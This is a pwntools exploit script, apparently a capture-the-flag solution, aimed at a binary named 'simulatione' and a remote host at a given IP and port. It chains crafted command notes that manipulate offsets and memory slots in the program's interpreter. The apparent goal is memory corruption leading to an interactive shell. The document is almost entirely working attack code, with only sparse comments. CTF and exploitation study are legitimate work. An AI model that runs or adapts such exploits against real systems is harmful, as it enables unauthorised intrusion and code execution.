#!/usr/bin/python3

from pwn import *

exe = ELF('simulatione', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def new_note(idx, n_cmd, next_note, cmd = b'', yn = b'', handler = -1):
    sln(b'> ', 1)
    sln(b'Index: ', idx)
    sln(b'command: ', n_cmd)
    sln(b'node: ', next_note)
    if cmd != b'':
        sa(b'list: ', cmd)
    if yn != b'' and handler != -1:
        sa(b'(y/n): ', yn)
        sln(b'handler: ', handler)
    
def run(id):
    sln(b'> ', 2)
    sln(b'start? ', id)

def GDB():
    gdb.attach(r, gdbscript='''
        # b*main+52
        # # b*new_node+844
        # b*simulate+694
        # b*simulate+1486
        # b*simulate+1587
        # b*store_val_safe+103
        # b*get_val_safe+25
        # b*main+212
        # # b*run+334
        # b*run+117
        # ni
        # c
        # c 8
    ''')


if args.REMOTE:
    r = remote('103.163.25.143', 20007)
else:
    r = process(exe.path)
    context.terminal = ["foot"]

### normal 0; re 1; mem 2

cmd = flat(
    0, 
    0, 0,
    0, 1,
    2, 0x201
)
print(cmd)
new_note(2, 1, 3, cmd, b'y', 1)
cmd = flat(
    1, # sub
    0, 0, # 0
    2, 0x200, # -0x100
    1, 0 # -0x100
)
new_note(3, 1, 4, cmd, b'y', 1)
cmd = flat(
    1, #sub
    1, 0, # -0x100
    0, 4, # -4
    1, 0 # -0x104
)
new_note(4, 1, 5, cmd, b'y', 1)
cmd = flat(
    1, 
    1, 0, #-0x104
    0, 4, # -4
    1, 0  # -0x108
)
new_note(5, 1, 6, cmd, b'y', 1)
cmd = flat(
    1, 
    1, 0, # -0x108
    0, 4, # -4
    1, 0  # -0x10c
)
new_note(6, 1, 7, cmd, b'y', 1)
cmd = flat(
    4, 
    2, 0x28, # command 4 save data here mem[0x28]
    1, 0, # -0x10c
    0, 0 # hole
)
new_note(7, 1, 8, cmd, b'y', 1)
cmd = flat(
    4, 
    2, 0x20, # command 4 save data here mem[0x20]
    0, 1, # -0x10c
    0, 0 # hole
)
new_note(8, 1, 9, cmd, b'y', 1) #
# copy from register to mem
cmd = flat(
    4, 
    2, 0x40,# command 4 save data here mem[0x40]
    0, 1, # -0x10c
    0, 0
)
new_note(9, 1, 11, cmd, b'y', 1)
cmd = flat(
    0, 
    0, 4,
    0, 4,
    1, 1,
    2, 
    1, 1,
    0, 4,
    1, 1,
    2, 
    1, 1,
    0, 3,
    1, 1,
    0, 
    1, 1,
    0, 4,
    1, 1,
    0, 
    1, 1,
    0, 1,
    1, 1,


    2, 
    0, 4,
    0, 3,
    1, 2,
    0, 
    1, 1,
    1, 2,
    1, 2,
    0, 
    1, 2,
    0, 1,
    1, 2,
)
new_note(11, 8, 12, cmd, b'y', 1)
cmd = flat(
    4, 
    2, 0x30,
    0, 0,
    0, 0,
    4, 
    2, 0x39,
    1, 1,
    0, 0,
    4, 
    2, 0x3a,
    1, 2,
    0, 0,
    3,
    2, 0x38,
    0, 4,
    2, 0x38,

    0, 
    1, 2,
    0, 1,
    2, 0,
    0, 
    1, 1,
    0, 3,
    2, 1,
    2,
    0, 4,
    0, 4,
    2, 0x48,
    4,
    2, 0x40,
    0, 2,
    0, 0,
    4,
    2, 0x50,
    0, 4,
    0, 0,
    4, 
    2, 8,
    0, 2,
    0, 0,
    4, 
    2, 0x18,
    0, 1,
    0, 0
)
new_note(12, 11, 13, cmd, b'y', 1)
cmd = flat(
    4, 
    0, 0,
    0, 0,
    0, 0
)
new_note(13, 1, 0, cmd, b'n', 265)
# GDB()
run(2)

r.interactive()
